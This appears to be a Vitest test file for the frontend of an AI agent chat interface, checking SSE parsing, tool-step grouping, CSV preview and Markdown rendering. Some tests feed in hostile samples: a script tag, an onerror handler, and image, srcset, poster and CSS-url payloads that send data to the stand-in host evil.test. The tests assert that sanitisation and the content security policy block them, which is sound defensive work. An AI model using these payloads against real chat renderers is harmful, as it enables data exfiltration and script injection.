import { describe, expect, it } from 'vitest'
import { toRelativePath } from './files'
import { renderMarkdown } from './markdown'
import { parseSseChunk } from './sse'
import { applyPacket, newTurn } from './turn'
import { buildWidgetDoc } from './widget'

describe('parseSseChunk', () => {
  it('解析完整行并保留残余', () => {
    const { packets, rest } = parseSseChunk('data: {"id":"1-0","event":"ai.token","data":{"text":"a"}}\n\ndata: {"ev')
    expect(packets).toHaveLength(1)
    expect(packets[0].id).toBe('1-0')
    expect(rest).toBe('data: {"ev')
  })
  it('接受 data: 后无空格、CRLF 换行', () => {
    const { packets, rest } = parseSseChunk('data:{"id":"1-0","event":"a","data":{}}\r\ndata: {"id":"2-0","event":"b","data":{}}\r\n: ping\r\nx')
    expect(packets.map((p) => p.id)).toEqual(['1-0', '2-0'])
    expect(rest).toBe('x')
  })
  it('忽略非 data 行与坏 JSON', () => {
    expect(parseSseChunk('event: x\ndata: {bad\n').packets).toEqual([])
  })
})

describe('applyPacket', () => {
  it('来源事件与历史记录使用同一结构', () => {
    const turn = newTurn()
    const source = { id: 'ref1', file_name: 'a.pdf', container_path: '/workspace/uploads/a.pdf', fingerprint: 'a'.repeat(64), location: { kind: 'page', page: 3 }, excerpt: '原文' }
    applyPacket(turn, { event: 'sources.presented', data: { sources: [source] } })
    expect(turn.parts).toEqual([{ type: 'sources', sources: [source] }])
  })
  it('连续 token 合并,已流式输出的正文不在 tool_call 上重复', () => {
    const t = newTurn()
    applyPacket(t, { event: 'ai.token', data: { text: '你' } })
    applyPacket(t, { event: 'ai.token', data: { text: '好' } })
    applyPacket(t, { event: 'ai.tool_call', data: { text: '你好', tool_calls: [{ id: 'c1', name: 'bash_tool', args: {} }] } })
    expect(t.parts).toHaveLength(2)
    expect(t.parts[0]).toEqual({ type: 'text', text: '你好' })
    expect(t.parts[1]).toMatchObject({ type: 'tool_call', id: 'c1' })
  })
  it('未流式输出时使用 tool_call 自带的正文', () => {
    const t = newTurn()
    applyPacket(t, { event: 'ai.tool_call', data: { text: '先看看', tool_calls: [] } })
    expect(t.parts[0]).toEqual({ type: 'text', text: '先看看' })
  })
  it('记录 error', () => {
    const t = newTurn()
    applyPacket(t, { event: 'error', data: { message: 'boom' } })
    expect(t.error).toBe('boom')
  })
})

describe('toRelativePath', () => {
  it('去掉 /workspace 前缀', () => {
    expect(toRelativePath('/workspace/output/a.pdf')).toBe('output/a.pdf')
    expect(toRelativePath('/workspace')).toBe('')
  })
})

describe('安全', () => {
  it('Markdown 渲染会清除脚本与事件属性', () => {
    const html = renderMarkdown('hi <script>alert(1)</script><img src=x onerror="alert(1)">')
    expect(html).not.toContain('<script')
    expect(html).not.toContain('onerror')
  })
  it('widget 文档带 CSP', () => {
    expect(buildWidgetDoc('<p>x</p>')).toContain('Content-Security-Policy')
  })
})

import { groupParts, latestTodos } from './steps'

describe('steps', () => {
  it('按 id 配对 tool_call 与 tool_result,未返回的保持执行中', () => {
    const items = groupParts([
      { type: 'tool_call', id: 'a', name: 'bash_tool', args: { command: 'ls' } },
      { type: 'tool_call', id: 'b', name: 'view_file', args: {} },
      { type: 'tool_result', id: 'a', name: 'bash_tool', content: 'ok', status: 'success' },
    ])
    expect(items).toHaveLength(2)
    expect(items[0]).toMatchObject({ kind: 'step', id: 'a', result: { content: 'ok' } })
    expect(items[1]).toMatchObject({ kind: 'step', id: 'b' })
    expect((items[1] as any).result).toBeUndefined()
  })
  it('latestTodos 取最后一次 write_todos', () => {
    const todos = latestTodos([
      { type: 'tool_call', id: '1', name: 'write_todos', args: { todos: [{ content: 'x', status: 'pending' }] } },
      { type: 'tool_call', id: '2', name: 'write_todos', args: { todos: [{ content: 'x', status: 'completed' }] } },
    ])
    expect(todos[0].status).toBe('completed')
    expect(latestTodos([])).toEqual([])
  })
})

import { parseCsv, previewKind } from './preview'

describe('preview', () => {
  it('按扩展名判断预览类型', () => {
    expect(previewKind('a.PNG')).toBe('image')
    expect(previewKind('a.pdf')).toBe('pdf')
    expect(previewKind('a.csv')).toBe('csv')
    expect(previewKind('a.docx')).toBe('office')
    expect(previewKind('a.XLSX')).toBe('office')
    expect(previewKind('a.zip')).toBe('none')
  })
  it('CSV 支持引号、转义与引号内换行,并限制行数', () => {
    expect(parseCsv('a,"b,1","c""d"\n1,2,3\n')).toEqual([['a', 'b,1', 'c"d'], ['1', '2', '3']])
    expect(parseCsv('x,"l1\nl2"\r\ny,z')).toEqual([['x', 'l1\nl2'], ['y', 'z']])
    expect(parseCsv('1\n2\n3\n', 2)).toHaveLength(2)
  })
})

describe('ask.user', () => {
  it('提问事件变成 ask part,并在步骤分组里保留', async () => {
    const { groupParts } = await import('./steps')
    const turn = newTurn()
    applyPacket(turn, {
      event: 'ask.user',
      data: { question: '输出什么格式?', kind: 'single_select', options: ['PDF', 'Word'] },
    })
    expect(turn.parts).toEqual([
      { type: 'ask', question: '输出什么格式?', kind: 'single_select', options: ['PDF', 'Word'] },
    ])
    expect(groupParts(turn.parts)).toEqual([
      { kind: 'ask', question: '输出什么格式?', askKind: 'single_select', options: ['PDF', 'Word'] },
    ])
  })
})

describe('groupParts', () => {
  it('ask_user_input 的调用与结果不显示成步骤', async () => {
    const { groupParts } = await import('./steps')
    const items = groupParts([
      { type: 'tool_call', id: 'c1', name: 'ask_user_input', args: {} },
      { type: 'tool_result', id: 'c1', name: 'ask_user_input', content: 'User answered: Word' },
    ])
    expect(items).toEqual([])
  })
})

import { isNearBottom } from './scroll'

describe('isNearBottom', () => {
  it('离底部很近才算跟随,向上翻看时不是', () => {
    expect(isNearBottom({ scrollHeight: 1000, scrollTop: 500, clientHeight: 450 })).toBe(true)
    expect(isNearBottom({ scrollHeight: 1000, scrollTop: 100, clientHeight: 450 })).toBe(false)
  })
})

describe('markdown 链接', () => {
  it('链接在新标签页打开且带 noopener', () => {
    const html = renderMarkdown('[x](https://example.com)')
    expect(html).toContain('target="_blank"')
    expect(html).toContain('noopener')
  })
})

describe('外传防护', () => {
  it('Markdown 远程图片被拦截,data 图片保留', () => {
    const html = renderMarkdown('![x](https://evil.test/?d=secret) ![y](data:image/png;base64,AAAA)')
    expect(html).not.toContain('evil.test')
    expect(html).toContain('[图片已拦截')
    expect(html).toContain('data:image/png')
  })
  it('widget CSP 不允许远程图片', () => {
    const doc = buildWidgetDoc('<p>x</p>')
    expect(doc).toContain("img-src data: blob:;")
    expect(doc).not.toMatch(/img-src[^;]*https/)
  })
})

import { splitBlocks } from './markdown'

it('代码围栏内较短或带内容的围栏不会提前结束代码块', () => {
  for (const inner of ['```', '````not-a-close']) {
    const code = `\`\`\`\`md\n${inner}\n\nstill code\n\`\`\`\``
    expect(splitBlocks(`${code}\n\nafter`)).toEqual([code, 'after'])
  }
})

describe('Markdown 分块渲染', () => {
  it('按空行分块,代码围栏内的空行不拆', () => {
    expect(splitBlocks('a\n\nb\n\n```py\nx\n\ny\n```\n\nc')).toEqual(['a', 'b', '```py\nx\n\ny\n```', 'c'])
  })
  it('分块渲染与整体渲染等价,且表格、列表保持完整', () => {
    const html = renderMarkdown('# T\n\n| a | b |\n|---|---|\n| 1 | 2 |\n\n- x\n- y\n\n```\ncode\n\nmore\n```')
    expect(html).toContain('<h1')
    expect(html).toContain('<table')
    expect(html).toContain('<li>x</li>')
    expect(html).toContain('code\n\nmore')
  })
  it('同一块重复渲染命中缓存,结果一致', () => {
    expect(renderMarkdown('hello **x**')).toBe(renderMarkdown('hello **x**'))
  })
})

describe('Markdown 分块:列表', () => {
  it('项间有空行的有序列表不被拆开,编号连续', () => {
    expect(splitBlocks('1. a\n\n2. b\n\n3. c\n\n段落')).toEqual(['1. a\n\n2. b\n\n3. c', '段落'])
    const html = renderMarkdown('1. a\n\n2. b')
    expect(html.match(/<ol/g)).toHaveLength(1)
  })
})

describe('Markdown 分块:性能与边界', () => {
  it('大量空行的长文也能线性完成,且结果与小样例一致', () => {
    const para = Array.from({ length: 20000 }, (_, i) => `段落 ${i}`).join('\n\n')
    const t0 = performance.now()
    const blocks = splitBlocks(para)
    expect(performance.now() - t0).toBeLessThan(1000)
    expect(blocks).toHaveLength(20000)
    const blanks = 'a' + '\n'.repeat(30000) + 'b'
    expect(splitBlocks(blanks).filter((b) => b.trim())).toEqual(['a', 'b'])
  })
  it('超长松散有序列表仍是一块,围栏内空行不拆', () => {
    const list = Array.from({ length: 3000 }, (_, i) => `${i + 1}. item`).join('\n\n')
    expect(splitBlocks(list)).toHaveLength(1)
    expect(splitBlocks('1. a\n\n   续行\n\n2. b')).toHaveLength(1)
  })
})

describe('parseSseChunk 形状检查', () => {
  it('丢弃不是对象或缺少字符串 event 的数据,补齐缺失的 data', () => {
    const { packets } = parseSseChunk('data: 123\ndata: [1]\ndata: {"event":5}\ndata: {"event":"x"}\ndata: {"event":"y","id":7,"data":[]}\n')
    expect(packets).toEqual([
      { event: 'x', data: {} },
      { event: 'y', data: {} },
    ])
  })
})

describe('外传防护:图片以外的自动请求', () => {
  it.each([
    '<div style="background:url(https://evil.test/?d=1)">x</div>',
    '<img srcset="https://evil.test/a.png 1x" src="data:image/png;base64,AA">',
    '<video poster="https://evil.test/p.png"></video>',
    '<picture><source srcset="https://evil.test/a.png"><img src="data:image/png;base64,AA"></picture>',
  ])('%s', (src) => {
    expect(renderMarkdown(src)).not.toContain('evil.test')
  })
})
